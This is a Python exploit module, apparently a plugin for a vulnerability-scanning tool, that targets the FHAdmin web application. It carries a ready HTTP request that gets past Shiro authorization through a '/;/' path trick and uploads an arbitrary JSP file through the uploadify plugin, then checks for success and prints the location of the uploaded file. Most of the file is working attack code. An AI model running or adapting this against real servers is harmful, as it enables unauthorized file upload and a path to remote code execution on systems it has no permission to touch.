from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class FHAdmin():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.status = env.get('status')
            
    def cve_20210824_upload(self):
        appName = 'FHAdmin'
        pocname = 'cve_20210824_upload'
        path = '/;/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/'
        method = 'post'
        desc = '[upload] 任意文件上传+shiro权限绕过'
        data = '--6aaf12c632ee6febfc354d1ba1bc914b\r\nContent-Disposition: form-data; name="imgFile"; filename="a5s_9y.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n123\r\n--6aaf12c632ee6febfc354d1ba1bc914b--'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=6aaf12c632ee6febfc354d1ba1bc914b'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"2021" in r.text:
                    print(r.text)
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(self.url+'/;/plugins/uploadify/'+result.strip('\r\n')+'\n\n'+data)
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpFHAdmin = FHAdmin(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpFHAdmin, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpFHAdmin.status
    else:#调用所有函数
        for func in dir(FHAdmin):
            if not func.startswith("__"):
                methodcaller(func)(ExpFHAdmin)
                result_list.append(func+' -> '+ExpFHAdmin.status)
                ExpFHAdmin.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)
















